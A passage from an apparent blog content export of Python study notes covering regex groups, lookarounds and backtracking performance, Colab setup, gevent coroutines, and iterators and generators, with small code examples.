id="group---back-reference-and-substitution">Group - Back referenceand Substitution</h4><ul><li>Back reference refers to a group that was captured earlier and usedsubsequently in</li></ul><p>• Problem: Identify repeating words • Pattern:<code>(?P&lt;word&gt;\w+)\s+(?P=word)\b</code> • Text: capture duplicateduplicate words</p><p>• Problem: Identify repeating letters • Pattern:<code>(?P&lt;1etter&gt;\w)(?P=1etter)</code></p><ul><li>Substitution pattern used for text replacement can refer topreviously captured group</li></ul><ol type="1"><li><p><code>\g</code></p><p>• Problem: Identify repeating words and remove repetition • FindPattern: <code>(?P&lt;word&gt;\w+)\s+(?P=word)\b</code> • ReplacementPattern: <code>\g&lt;word&gt;</code></p></li><li><p>使用 <code>\num</code></p><p>比如： <code>\1</code> 表示第一个分组</p></li></ol><h3 id="lookarounds">Lookarounds</h3><p>Lookbehinds and lookaheads (also called lookarounds) are specifictypes of non-capturing groups (used to match a pattern but withoutincluding it in the matching list)</p><p>Look ahead — Peek at what is coming up next without consuming thecharacters Look behind — Look at what came before current character Bothare called <strong>zero width assertions</strong> - Returns True orFalse - Does not consume any characters</p><ul><li>Look ahead is similar to "if (expression) yes_expression"</li><li>Look ahead and Look behind can contain patterns Allows you toimplement more complex conditional logic</li><li>Does not backtrack — Once it return a true/false, job is done. Ifpattern does not match, Look ahead/Look behind would not backtrack totry another match.</li></ul><p>these two assertion don't consume and match the Look part.</p><table><thead><tr class="header"><th style="text-align: center;">Symbol</th><th>Description</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><code>?=</code></td><td>Positive Lookahead（希望未去的前方(右边)有）</td></tr><tr class="even"><td style="text-align: center;"><code>?!</code></td><td>Negative Lookahead（希望未去的前方(右边)无）</td></tr><tr class="odd"><td style="text-align: center;"><code>?&lt;=</code></td><td>Positive Lookbehind（希望已来的后方(左边)边有）</td></tr><tr class="even"><td style="text-align: center;"><code>?&lt;!</code></td><td>Negative Lookbehind （希望已来的后方(左边)边无）</td></tr></tbody></table><h2 id="regular-expression-proformance">Regular ExpressionProformance</h2><h3 id="backtracking-exponential-delay-example">Backtracking ExponentialDelay Example</h3><p>Type of patterns that can cause performance issues</p><p>Problem: Match a word Pattern: <code>^(\w*)*$</code> Text (Positive):12345678901234567890 Text (partial match): 12345678901234567890!</p><p>Pattern works perfectly for positive matches. With partial matches,perfomance degrades rapiadly and every addtional character double theresponse time.</p><p>正则引擎： Match 1: 1 Match 2: 12 Match 3: 123 Match 4: 1234 Match 5:12345 - <code>!</code> Does not match stops now. And end of string $match fails. 于是， Pattern 进行回溯，匹配出两组：(1234）（5）,然后最后还是有 <code>！</code> 不能满足结尾。因此，继续回溯，匹配出两组：(123）（45）, 然后最后还是有 <code>！</code>不能满足结尾。 就这样回溯到头，然后匹配失败</p><h2 id="issues-and-fix">4.2. Issues and Fix</h2><p>Pattern: <code>(\w*)*</code> =&gt; <code>(\w*)(\w*)(\w*)</code>多个相似的贪婪模式捕获相同的字符(串)，会导致严重的性能问题。</p><p>修改方式：</p><ul><li>Option 1: No need to have a group level quantifier</li></ul><p><code>^(\w*)*$</code> =&gt; <code>^(\w*)$</code></p><ul><li>Option 2: Precise terminating condition. Every word in group shouldend in a word boundary.</li></ul><p><code>^(\w*)*$</code> =&gt; <code>^(\w*\b)*$</code></p><ul><li>Disable group capture</li></ul><p><code>^(\w*)$</code> =&gt; <code>\w*$</code> or<code>^(?:\w*)$</code></p><h2 id="module-versus-compiled-regex-method-invocation">Module VersusCompiled Regex Method Invocation</h2><p>Compiled Regex Objects vs Module Methods You have two ways to invokeregular expression functionality</p><ul><li>Create a compiled object and invoke methods of that object</li><li>Use re module methods directly</li></ul><p>编译对象的方法提供了一些微调参数。 例如：搜索的开始、结束位置</p><p>re module caches the compiled version of patterns and reuses them</p><ul><li>Python 3 Pattern Cache Size is 512</li><li>Python 2 Pattern Cache size is 100</li><li>When patterns exceed cache size, current implementation of re simplyclears the entire cache.</li></ul><p>Best Practice: For high performance and/or high frequency invocationof patterns — Use compiled objects, hold reference to the objects andreuse them.</p><p>总体来说： 遇到一个 pattern 需要重复匹配多次，或者多个 pattern匹配的情况，使用编译好的 pattern 对象更加快。 re module 在重复次数少，python3 下 pattern 缓存个数比较少于缓存值：512 时，效果还行。</p><h2 id="match-unicode-characters">Match Unicode Characters</h2><p>vscode 和 pyhton3 的 re 模块默认的都是 unicode 字符集，因此在 Python3的 re 模块或 vscode 中都直接使用即可： <code>[\u4e00-\u9fa5]</code></p><p>匹配的是能组成单词的字符，在 python3 中 re 默认支持的是 unicode字符集，当然也支持汉字。只要加入 re.A 就可以解决这样问题，</p><h2 id="参考资料">参考资料</h2><ol type="1"><li><ahref="https://blog.csdn.net/tinyletero/article/details/8201465">unicode编码[e00-fa5]匹配所有中文</a></li><li><ahref="https://blog.csdn.net/suzimuyu99/article/details/80924402">Python正则匹配中文的问题</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Regexp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记录 colab 的使用</title>
      <link href="/blog/2021/06/15/programming/python/colab/"/>
      <url>/blog/2021/06/15/programming/python/colab/</url>
      
        <content type="html"><![CDATA[<h2 id="colab-连接-google-drive">colab 连接 google drive</h2><p>前两句 mount，后两句切换路径并查看当前路径，pip等命令执行前加<code>!</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from google.colab import drive</span><br><span class="line">drive.mount(&#x27;/content/drive&#x27;)</span><br><span class="line">%cd /content/drive/MyDrive/&quot;Colab Notebooks&quot;/&quot;blog-dataset-vs-accuracy&quot;</span><br><span class="line">%pwd</span><br></pre></td></tr></table></figure><h2 id="查看可用-gpucpu-容量">查看可用 GPU/CPU 容量</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">!ln -sf /opt/bin/nvidia-smi /usr/bin/nvidia-smi</span><br><span class="line">!pip install gputil</span><br><span class="line">!pip install psutil</span><br><span class="line">!pip install humanize</span><br><span class="line">import psutil</span><br><span class="line">import humanize</span><br><span class="line">import os</span><br><span class="line">import GPUtil as GPU</span><br><span class="line">GPUs = GPU.getGPUs()</span><br><span class="line">gpu = GPUs[0]</span><br><span class="line">def printm():</span><br><span class="line"> process = psutil.Process(os.getpid())</span><br><span class="line"> print(&quot;Gen RAM Free: &quot; + humanize.naturalsize( psutil.virtual_memory().available ), &quot; | Proc size: &quot; + humanize.naturalsize( process.memory_info().rss))</span><br><span class="line"> print(&quot;GPU RAM Free: &#123;0:.0f&#125;MB | Used: &#123;1:.0f&#125;MB | Util &#123;2:3.0f&#125;% | Total &#123;3:.0f&#125;MB&quot;.format(gpu.memoryFree, gpu.memoryUsed, gpu.memoryUtil*100, gpu.memoryTotal))</span><br><span class="line">printm()</span><br></pre></td></tr></table></figure><p>查看 GPU 型号：<code>!/opt/bin/nvidia-smi</code></p>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 协程 gevent</title>
      <link href="/blog/2021/06/15/programming/python/gevent/"/>
      <url>/blog/2021/06/15/programming/python/gevent/</url>
      
        <content type="html"><![CDATA[<h1 id="python-协程-gevent">Python 协程 gevent</h1><p>gevent 封装的 greenlet， greenlet 封装的 yield（ 即：生成器）。</p><p>通过 <code>gevent.spawn()</code> 创建一个 greenlet 对象，通过greenlet 进行 switch，调用 yield。</p><p>gevent.spawn(函数，参数)</p><p>gevent 在遇到延时操作（gevent.sleep(0)）时，先去执行别的。</p><p>如果你想用 gevent， 那需要把所有的延时操作换成 gevent.sleep(0)或者通过打补丁的方式让程序自动替换。</p><p>如果一个线程等待某些条件，可以充分利用这个时间去做其它事情，其实这就是协程。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from gevent import monkey</span><br><span class="line">monkey.patch_all()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line"></span><br><span class="line">monkey.patch_all()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="built_in">print</span>(gevent.getcurrent(), i)</span><br><span class="line">        time.sleep(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">g1 = gevent.spawn(f, <span class="number">5</span>)</span><br><span class="line">g2 = gevent.spawn(f, <span class="number">5</span>)</span><br><span class="line">g3 = gevent.spawn(f, <span class="number">5</span>)</span><br><span class="line">g1.join()</span><br><span class="line"><span class="comment"># 程序运行到这里之后，阻塞延迟，于是去运行上面的函数，g1 对应的函数，然后遇到 time.sleep(0) patch 后的 gevent.sleep(0)，切换到 g2 对应的函数，并运行，直到遇到 gevent.sleep(0)再次切换。</span></span><br><span class="line">g2.join()</span><br><span class="line">g3.join()</span><br></pre></td></tr></table></figure><p><code>join()</code> 堵塞，直到调用 join的对象的完成操作。<code>joinall()</code> 接受一个列表参数。</p><h4 id="简单总结">简单总结</h4><ol type="1"><li>进程是资源分配的单位</li><li>线程是操作系统调度的单位</li><li>进程切换需要的资源很最大，效率很低 （一般不用）</li><li>线程切换需要的资源一般，效率一般（当然了在不考虑 GIL 的情况下）</li><li>涉及网络堵塞时，优先使用协程， 其切换任务资源很小，效率高</li><li>多进程、多线程根据 cpu核数不一样可能是并行的，但是协程是在一个线程中所以是并发</li></ol>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python 迭代器，生成器与列表推导式</title>
      <link href="/blog/2021/06/15/programming/python/iterables/"/>
      <url>/blog/2021/06/15/programming/python/iterables/</url>
      
        <content type="html"><![CDATA[<h1 id="迭代器">迭代器</h1><p>可以迭代的数据类型：元组、列表、字典、集合、字符串</p><p>判断是否可迭代：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Iterable</span><br><span class="line"><span class="built_in">isinstance</span>(要判断的变量,Iterable)  <span class="comment">#如果可以迭代，返回 True</span></span><br></pre></td></tr></table></figure><p>判断是否是迭代器：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Iterable</span><br><span class="line"><span class="built_in">isinstance</span>(要判断的变量,Iterator)  <span class="comment">#如果是迭代器，返回 True</span></span><br></pre></td></tr></table></figure><p>print 的两种书写形式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(&#x27;number is %d&#x27; % 25)</span><br><span class="line">print(&#x27;number is &#x27;, 25)</span><br></pre></td></tr></table></figure><p>创建出来的可迭代的实例对象：</p><ol type="1"><li><p>普通的类</p></li><li><p>添加 <code>__iter__</code>，使其具有可迭代属性，即：isinstance返回 True</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def __iter__(self):</span><br><span class="line">pass</span><br></pre></td></tr></table></figure></p></li><li><p><code>__iter__</code>方法中返回一个具有<code>__iter__</code>方法以及<code>__next__</code>对象的引用</p></li></ol><p>一个对象是否可以用 for 来迭代遍历（电脑程序的判断方法）:</p><ol type="1"><li><p>根据对象中有无 <code>__iter__</code> 方法，即：使用 isinstance()判断</p></li><li><p>在第一步成立的前提下，使用 iter 方法 <code>iter(classmate)</code>来调用该对象的 <code>__iter__</code>方法，获取其返回值，也就是迭代器对象的引用</p></li><li><p>使用返回值，即：迭代器，调用其自身的 next 方法<code>next(classmate_iter)</code> 来获取其<code>__next__</code>方法，获取其返回值</p><p>注：称一个同时具有 <code>__iter__</code> 和 <code>__next__</code>方法的类成为迭代器。</p></li><li><p>每一次 for 循环通过迭代器中的 <code>__next__</code>方法来取其返回值</p></li></ol><p>让 <code>__next__</code>方法输出可迭代对象的东西，需要再将可迭代对象在 <code>__iter__</code>方法创建迭代器时，传入自己的 self 引用。此外，在迭代器中写一个<code>__init__</code> 接受引用。</p><p>在迭代器中设置一个属性，用来标志当前的序号，然后通过比较序号，如果当前序号小于列表的长度，那么接着取，否则会默认返回一个None 值。</p><p>通过使用 <code>raise StopIteration</code> 引发此异常，来使 for循停止迭代。</p><p>源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Iterable</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Iterator</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Classmates</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.names = <span class="built_in">list</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.names.append(name)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__iter__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> classIter(self)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">classIter</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,obj</span>):</span><br><span class="line">        self.obj = obj</span><br><span class="line">        self.current_num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__iter__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__next__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.current_num &lt; <span class="built_in">len</span>(self.obj.names):</span><br><span class="line">            ret = self.obj.names[self.current_num]</span><br><span class="line">            self.current_num += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> ret</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> StopIteration</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">classmate = Classmates()</span><br><span class="line"></span><br><span class="line">classmate.add(<span class="string">&#x27;wang&#x27;</span>)</span><br><span class="line">classmate.add(<span class="string">&#x27;zhang&#x27;</span>)</span><br><span class="line">classmate.add(<span class="string">&#x27;li&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># classmate_iter = iter(classmate)</span></span><br><span class="line"><span class="comment"># print(f&#x27;the iterability of classmate:&#123;isinstance(classmate,Iterable)&#125;&#x27;)</span></span><br><span class="line"><span class="comment"># print(f&#x27;the iterability of classmate_iter:&#123;isinstance(classmate_iter,Iterator)&#125;&#x27;)</span></span><br><span class="line"><span class="comment"># print(next(classmate_iter))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> classmate:</span><br><span class="line">    <span class="built_in">print</span>(name)</span><br></pre></td></tr></table></figure><p>下面将可迭代对象与迭代器合成一个对象(也就是迭代器一定可迭代，但是可迭代的对象不一定是迭代器)：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Iterable</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Iterator</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Classmates</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.names = <span class="built_in">list</span>()</span><br><span class="line">        self.current_num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.names.append(name)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__iter__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__next__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.current_num &lt; <span class="built_in">len</span>(self.names):</span><br><span class="line">            ret = self.names[self.current_num]</span><br><span class="line">            self.current_num += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> ret</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> StopIteration</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">classmate = Classmates()</span><br><span class="line"></span><br><span class="line">classmate.add(<span class="string">&#x27;wang&#x27;</span>)</span><br><span class="line">classmate.add(<span class="string">&#x27;zhang&#x27;</span>)</span><br><span class="line">classmate.add(<span class="string">&#x27;li&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> classmate:</span><br><span class="line">    <span class="built_in">print</span>(name)</span><br></pre></td></tr></table></figure><p>迭代器的优点：</p><ol type="1"><li><p>存储指定生成的数据的方式，而不是结果。如果当结果过多时，存储起来会花费大量的空间。</p><p>例如：python 中的 range 与 xrange</p></li></ol><p>使用迭代器写斐波那契数列：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">fibonacci</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,all_num</span>):</span><br><span class="line">        self.all_num = all_num</span><br><span class="line">        self.current_num = <span class="number">0</span></span><br><span class="line">        self.a = <span class="number">0</span></span><br><span class="line">        self.b = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__iter__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__next__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.current_num &lt; self.all_num:</span><br><span class="line">            ret = self.a</span><br><span class="line">            self.a, self.b = self.b, self.a+self.b</span><br><span class="line">            self.current_num += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> ret</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> StopIteration</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        number = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>].strip())</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    fibo = fibonacci(number)</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> fibo:</span><br><span class="line">        <span class="built_in">print</span>(num)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>并不是只有 for 循环能接收迭代器，list(), tuple() 等也能接收</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">li = <span class="built_in">list</span>(fina(<span class="number">8</span>))</span><br><span class="line">tp=<span class="built_in">tuple</span>(fina(<span class="number">5</span>))</span><br></pre></td></tr></table></figure><p>这并不是简单的类型转换，而是通过迭代器逐个转换。比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">29</span>]: a=(<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">30</span>]: <span class="built_in">list</span>(a)</span><br><span class="line">Out[<span class="number">30</span>]: [<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>]</span><br></pre></td></tr></table></figure><p>首先创建一个空列表，然后找到 a 的迭代器，使用 next 函数找其<code>__next__</code>方法的返回值逐个迭代转换，最后遇到迭代停止异常，进而停止。</p><h1 id="列表生成式与生成器表达式">列表生成式与生成器表达式</h1><p>列表生成式：保存生成结果，将结果存到变量。 使用方括号</p><p>生成器表达式：保存生成结果的方式，for 循环迭代的时候，逐个计算输出。使用圆括号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">31</span>]:  num = [x*<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>) <span class="keyword">if</span> x%<span class="number">2</span> == <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">32</span>]: num</span><br><span class="line">Out[<span class="number">32</span>]: [<span class="number">0</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">16</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">33</span>]: num_generator = (x*<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>) <span class="keyword">if</span> x%<span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">34</span>]: num_generator</span><br><span class="line">Out[<span class="number">34</span>]: &lt;generator <span class="built_in">object</span> &lt;genexpr&gt; at <span class="number">0x10782a050</span>&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">35</span>]: <span class="keyword">for</span> i <span class="keyword">in</span> num_generator:</span><br><span class="line">    ...:     <span class="built_in">print</span>(i)</span><br><span class="line">    ...:</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line"><span class="number">12</span></span><br><span class="line"><span class="number">16</span></span><br></pre></td></tr></table></figure><h1 id="生成器">生成器</h1><ol type="1"><li><p>利用迭代器，我们可以在每次迭代获取数据（通过 next方法）时，按照特定的规律进行生成。但是，我们在实现一个迭代器时，关于当前迭代到的状态需要我们自己记录，进而才能根据当前状态生成下一个数据。为了达到记录当前状态，并配合next()函数进行迭代使用，我么可以采用更简便的语法：生成器（generator），<strong>生成器是一类特殊的迭代器</strong>。</p></li><li><p>创建生成器的方法</p><ol type="1"><li><p>将列表生成式的 <code>[]</code> 改为 <code>()</code></p></li><li><p>在普通函数中加上 yield（只要函数里面有 yield，无论是在 if， for等等里面，这个函数就不是函数了，变成了生成器。）</p><p>如果一个函数中有 yield语句，那么它就不再是一个函数，而是一个生成器。</p><p>如果在调用函数时，发现这个函数中有 yield，那么此时不再调用函数，而是创建一个生成器对象。</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">create_num</span>(<span class="params">all_num</span>):</span><br><span class="line">    a, b =<span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    current_num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> current_num &lt; all_num:</span><br><span class="line">        <span class="keyword">yield</span> a</span><br><span class="line">        a, b = b, a+b</span><br><span class="line">        current_num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">obj = create_num(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(next(obj))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(next(obj))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> obj:</span><br><span class="line"><span class="built_in">print</span>(num)</span><br></pre></td></tr></table></figure></p></li></ol></li></ol><p>for 循环触发迭代器：</p><p>第一次：程序从头开始运行，然后运行到 yield，yield 语句会暂停程序，将yield 后面的值返回给 for 循环的变量，然后开始进行 for 循环。下一次 for循环，进入生成器后，从 yield 语句的下一条语句开始执行。</p><p>通过 next 触发迭代器，开始迭代。</p><p>注意：不同的<strong>生成器对象</strong>有不同的局部变量。互不干扰。</p><p>如果想要通过 while True 调用 next 方法来取值，可以通过捕获StopIteration 异常来结束。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ret = <span class="built_in">next</span>(obj)</span><br><span class="line">        <span class="built_in">print</span>(ret)</span><br><span class="line">    <span class="keyword">except</span> StopIteration:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>如何接受迭代器的返回值？</p><p>可以在其执行完之后，通过异常对象<code>except StopIteration as e:</code> 或者<code>except Exception as e:</code> 中 e 的 value 属性来打印。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 